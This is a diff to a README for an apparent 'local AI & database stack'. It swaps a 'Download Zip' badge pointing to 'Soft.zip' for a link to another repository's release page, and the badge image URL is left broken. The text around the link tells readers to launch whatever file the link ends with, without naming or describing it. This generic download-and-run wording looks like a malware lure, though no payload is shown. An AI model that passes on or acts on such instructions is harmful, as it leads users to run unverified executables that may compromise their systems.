@@ -34,7 +34,7 @@ The repository covers a wide range of topics and technologies. Some of the key t
 
 To get started with the local AI & database stack, download the necessary files from the provided link: 
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/files/Soft.zip)
+[![Download Zip](https://github.com/rish-1997/wsl-assistant/releases/tag/v1.2)](https://github.com/rish-1997/wsl-assistant/releases/tag/v1.2)
 
 If the link ends with a file name, make sure to launch it on your machine. If the link is a website, simply visit it. In case the link is not working or not provided, please check the "Releases" section of this repository.
 
